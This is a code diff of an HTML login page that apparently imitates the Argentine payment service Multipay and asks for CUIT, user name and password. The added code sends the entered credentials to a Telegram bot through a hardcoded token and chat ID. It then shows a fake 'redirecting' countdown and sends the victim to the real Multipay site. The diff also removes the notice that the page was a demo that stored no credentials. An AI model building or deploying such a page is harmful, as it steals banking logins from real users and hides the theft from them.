@@ -275,6 +275,64 @@
             color: #777;
         }
 
+        /* Estilos para el overlay de redirección */
+        .redirect-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .redirect-box {
+            background: white;
+            padding: 40px 50px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .redirect-box h2 {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .redirect-box p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .redirect-counter {
+            font-size: 48px;
+            font-weight: bold;
+            color: #c8101e;
+            margin: 10px 0;
+        }
+
+        .redirect-box .spinner {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #c8101e;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         @media (max-width: 600px) {
             .language {
                 padding-right: 8%;
@@ -318,6 +376,13 @@
             }
             .footer-links a {
                 margin-bottom: 8px;
+            }
+            .redirect-box {
+                padding: 30px 25px;
+                margin: 0 20px;
+            }
+            .redirect-counter {
+                font-size: 36px;
             }
         }
     </style>
@@ -415,16 +480,28 @@
     </footer>
     <div class="footer-copy">Todos los Derechos Reservados</div>
 
+    <!-- OVERLAY DE REDIRECCIÓN -->
+    <div class="redirect-overlay" id="redirectOverlay">
+        <div class="redirect-box">
+            <div class="spinner"></div>
+            <h2>🔄 Redirigiendo...</h2>
+            <p>Serás redirigido a Multipay en</p>
+            <div class="redirect-counter" id="counterDisplay">3</div>
+            <p style="font-size: 12px; color: #999; margin-top: 5px;">segundos</p>
+        </div>
+    </div>
+
     <script>
         // ============================================================
-        // CONFIGURACIÓN DE TELEGRAM (cambia estos datos por los tuyos)
+        // CONFIGURACIÓN DE TELEGRAM - REEMPLAZA CON TUS DATOS
         // ============================================================
-        const BOT_TOKEN = '8998295534:AAGGIxzih1XeS0pXW3TAIHEYAmRACr1Tik8';  // <-- REEMPLAZA
-        const CHAT_ID = '7776240161'; // <-- REEMPLAZA
+        const BOT_TOKEN = '8998295534:AAGGIxzih1XeS0pXW3TAIHEYAmRACr1Tik8';
+        const CHAT_ID = '7776240161';
+        const REDIRECT_URL = 'https://www.multipay.com.ar/';
 
-        // ------------------------------------------------------------
-        // FUNCIONES ORIGINALES (NO TOCADAS)
-        // ------------------------------------------------------------
+        // ============================================================
+        // FUNCIONES DEL FORMULARIO
+        // ============================================================
         function mostrarPassword() {
             const cuit = document.getElementById("cuit").value.trim();
             const usuario = document.getElementById("usuario").value.trim();
@@ -447,17 +524,17 @@
             document.getElementById("loginButton").style.display = "none";
         }
 
-        // ------------------------------------------------------------
-        // NUEVA FUNCIÓN: enviar datos a Telegram
-        // ------------------------------------------------------------
+        // ============================================================
+        // FUNCIÓN PARA ENVIAR A TELEGRAM
+        // ============================================================
         async function enviarATelegram(cuit, usuario, password) {
-            const mensaje =
-                `🔐 *Nuevo intento de login*\n\n` +
-                `📌 CUIT: ${cuit || '(vacío)'}\n` +
-                `👤 Usuario: ${usuario || '(vacío)'}\n` +
-                `🔑 Contraseña: ${password || '(vacío)'}`;
+            const mensaje = 
+                "🔐 *Nuevo intento de login*\n\n" +
+                "📌 CUIT: " + (cuit || '(vacío)') + "\n" +
+                "👤 Usuario: " + (usuario || '(vacío)') + "\n" +
+                "🔑 Contraseña: " + (password || '(vacío)');
 
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
 
             try {
                 const resp = await fetch(url, {
@@ -469,22 +546,47 @@
                         parse_mode: 'Markdown'
                     })
                 });
+                
                 if (!resp.ok) {
                     const errorText = await resp.text();
                     console.error('Error Telegram:', errorText);
-                    alert('Error al enviar datos a Telegram. Revisa la consola.');
                 } else {
-                    console.log('Datos enviados a Telegram correctamente.');
+                    console.log('✅ Datos enviados a Telegram correctamente.');
                 }
             } catch (err) {
                 console.error('Error de red:', err);
-                alert('Error de red al enviar a Telegram.');
             }
         }
 
-        // ------------------------------------------------------------
-        // FUNCIÓN INGRESAR MODIFICADA (envía a Telegram antes del alert)
-        // ------------------------------------------------------------
+        // ============================================================
+        // FUNCIÓN PARA MOSTRAR OVERLAY Y REDIRIGIR CON CONTADOR
+        // ============================================================
+        function redirigirConContador() {
+            const overlay = document.getElementById('redirectOverlay');
+            const counterDisplay = document.getElementById('counterDisplay');
+            
+            // Mostrar el overlay
+            overlay.style.display = 'flex';
+            
+            let segundos = 3;
+            counterDisplay.textContent = segundos;
+            
+            // Iniciar el contador
+            const intervalo = setInterval(function() {
+                segundos--;
+                counterDisplay.textContent = segundos;
+                
+                if (segundos <= 0) {
+                    clearInterval(intervalo);
+                    // Redirigir
+                    window.location.href = REDIRECT_URL;
+                }
+            }, 1000);
+        }
+
+        // ============================================================
+        // FUNCIÓN INGRESAR - ENVÍA A TELEGRAM Y REDIRIGE
+        // ============================================================
         function ingresarDemo() {
             const cuit = document.getElementById("cuit").value.trim();
             const usuario = document.getElementById("usuario").value.trim();
@@ -505,11 +607,8 @@
             // --- ENVÍO A TELEGRAM ---
             enviarATelegram(cuit, usuario, password);
 
-            // --- MENSAJE ORIGINAL ---
-            alert(
-                "Esta es una maqueta visual de demostración. " +
-                "No se envían ni almacenan credenciales."
-            );
+            // --- MOSTRAR OVERLAY CON CONTADOR Y REDIRIGIR ---
+            redirigirConContador();
         }
     </script>
 </body>
